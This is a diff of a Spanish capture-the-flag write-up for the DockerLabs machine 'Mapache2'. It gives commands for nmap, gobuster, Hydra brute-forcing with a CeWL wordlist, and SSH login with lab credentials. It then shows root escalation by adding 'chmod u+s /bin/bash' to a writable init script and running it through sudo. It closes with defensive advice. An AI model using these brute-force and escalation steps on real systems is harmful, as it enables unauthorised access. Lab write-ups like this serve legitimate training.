@@ -1,60 +1,256 @@
-# MAPACHE2 — DockerLabs
+# Mapache2 — DockerLabs
 
 **Plataforma:** DockerLabs  
-**Dificultad:** 🟠 Media  
+**Dificultad:** 🟡 Medio  
 **SO:** Linux  
+**Autor de la máquina:** d1se0  
+**Fecha de creación:** 29/08/2024  
+**Técnicas:** Gobuster · Hydra · CeWL · SSH · Information Disclosure · Writable Init Script · sudo service abuse · SUID escalation
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **MAPACHE2** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
+3. [Fuerza bruta con diccionario personalizado](#3-fuerza-bruta-con-diccionario-personalizado)
+4. [Acceso SSH — usuario Kinder](#4-acceso-ssh--usuario-kinder)
+5. [Escalada de privilegios](#5-escalada-de-privilegios)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar la maquina vulnerable.
+Desplegamos la máquina vulnerable:
 
-Haremos un escaneo profundo de los puertos abiertos de la máquina.
+```bash
+sudo bash auto_deploy.sh mapache2.tar
+```
 
-## 2. Enumeración
+> IP asignada: `172.17.0.2`
 
-Vemos que tenemos el servicio http, así que haremos un gobuster para listar
-directorios escondidos.
+Realizamos un escaneo profundo:
 
-Encontramos un login.php.
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+```
 
-## 3. Explotación
+Resultado:
 
-Tambien encontramos una pista en el puerto 3306
+```text
+22/tcp open ssh
+80/tcp open http
+3306/tcp open mysql
+```
 
-Despues de hacer un ataque con el rockyou y no tener resultados, haremos un
-ataque con un diccionario generado con cewl, que recolecta datos y genera un
-diccionario.
+Servicios detectados:
 
-## 4. Post-explotación
+```text
+Hackerspace
+MySQL
+OpenSSH
+```
 
-Ahora hacemos el ataque de fuerza bruta y vemos que encontramos la
-contraseña.
+---
 
-Ahora cuando nos logeamos, encontramos la siguiente pista.
-El usuario será Kinder y contraseña medusa.
+## 2. Enumeración web — Gobuster
+
+Enumeramos directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2 \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+-x php,html,py,txt -t 100
+```
+
+Resultado:
+
+```text
+/login.php
+/db.php
+/index.html
+```
+
+Accedemos al panel de login:
+
+```text
+http://172.17.0.2/login.php
+```
+
+También encontramos una pista accediendo al puerto 3306 vía navegador:
+
+```text
+We have to change this, I told Medusa to protect this more.
+```
+
+La palabra **Medusa** parece relevante para posibles credenciales.
+
+---
+
+## 3. Fuerza bruta con diccionario personalizado
+
+Probamos inicialmente con `rockyou.txt` sin éxito.
+
+Generamos un diccionario personalizado utilizando CeWL:
+
+```bash
+cewl http://172.17.0.2 > passwords.txt
+```
+
+Realizamos fuerza bruta con Hydra:
+
+```bash
+hydra -l medusa -P passwords.txt \
+172.17.0.2 http-post-form \
+"/login.php:username=^USER^&password=^PASS^:Invalid credentials"
+```
+
+Resultado:
+
+```text
+login: medusa
+password: enthusiasts
+```
+
+Accedemos al panel web.
+
+Inspeccionando el código fuente encontramos una pista oculta:
+
+```html
+I hope my boss doesn't kill me, but I tell Kinder what a mess medusa made with the message from the port...
+```
+
+Obtenemos:
+
+```text
+Usuario: Kinder
+Contraseña: medusa
+```
+
+---
+
+## 4. Acceso SSH — usuario Kinder
+
+Accedemos mediante SSH:
+
+```bash
+ssh Kinder@172.17.0.2
+```
+
+Contraseña:
+
+```text
+medusa
+```
+
+Acceso correcto.
+
+Comprobamos privilegios sudo:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(ALL : ALL) NOPASSWD: /usr/sbin/service apache2 restart
+```
+
+---
 
 ## 5. Escalada de privilegios
 
-Accedemos por ssh a este usuario.
+Buscamos el servicio Apache:
 
-Ahora hacemos un sudo -l para ver si contamos con con binarios por donde
-podamos escalar privilegios.
+```bash
+find / -name apache2 2>/dev/null
+```
 
-## 6. Lección aprendida
+Resultado relevante:
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+```text
+/etc/init.d/apache2
+```
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+Exploramos permisos:
+
+```bash
+cd /etc/init.d
+ls -la
+```
+
+Observamos que el script `apache2` es modificable.
+
+Editamos el fichero:
+
+```bash
+nano apache2
+```
+
+Añadimos:
+
+```bash
+#!/bin/sh
+
+chmod u+s /bin/bash
+```
+
+Ejecutamos el servicio como root:
+
+```bash
+sudo /usr/sbin/service apache2 restart
+```
+
+Verificamos permisos:
+
+```bash
+ls -la /bin/bash
+```
+
+Resultado:
+
+```text
+-rwsr-xr-x
+```
+
+Ejecutamos Bash preservando privilegios:
+
+```bash
+bash -p
+```
+
+Verificamos acceso:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 6. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| Información sensible expuesta | Descubrimiento de usuarios |
+| Contraseñas débiles | Acceso inicial |
+| Uso de CeWL para OSINT | Generación de diccionarios efectivos |
+| Script init modificable | Escalada de privilegios |
+| sudo sobre service | Ejecución como root |
+
+**Para defenderse:**
+
+- Evitar exposición de pistas en aplicaciones web.
+- Aplicar políticas robustas de contraseñas.
+- Restringir permisos sobre scripts del sistema.
+- Limitar comandos sudo peligrosos.
+- Auditar servicios ejecutados con privilegios elevados.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
